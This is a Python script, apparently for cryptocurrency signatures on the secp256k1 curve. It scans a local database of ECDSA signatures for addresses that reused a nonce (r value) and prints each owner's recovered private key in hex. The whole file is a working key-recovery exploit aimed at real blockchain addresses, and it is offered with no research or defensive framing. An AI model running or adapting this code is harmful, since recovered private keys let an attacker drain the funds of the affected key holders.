import sqlite3
from collections import Counter

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def solve_r_reuse(s1, z1, s2, z2, r):
    try:
        k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
        d = ((s1 * k - z1) * pow(r, -1, P)) % P
        return d
    except: return None

def find_real_r_reuse():
    conn = sqlite3.connect('cryscout.db')
    cur = conn.cursor()
    cur.execute("SELECT address, r_int, s_int, z_int, txid FROM signatures")
    rows = cur.fetchall()
    
    sigs_by_addr = {}
    for addr, r, s, z, txid in rows:
        if addr not in sigs_by_addr: sigs_by_addr[addr] = []
        sigs_by_addr[addr].append({'r': int(r), 's': int(s), 'z': int(z), 'txid': txid})
        
    for addr, sigs in sigs_by_addr.items():
        r_groups = {}
        for sig in sigs:
            r = sig['r']
            if r not in r_groups: r_groups[r] = []
            r_groups[r].append(sig)
            
        for r, group in r_groups.items():
            if len(group) > 1:
                for i in range(len(group)):
                    for j in range(i + 1, len(group)):
                        if group[i]['z'] != group[j]['z']:
                            print(f"!!! REAL R-REUSE FOUND for {addr} !!!")
                            d = solve_r_reuse(group[i]['s'], group[i]['z'], group[j]['s'], group[j]['z'], r)
                            if d:
                                print(f"Key: {hex(d)}")
    conn.close()

if __name__ == "__main__":
    find_real_r_reuse()
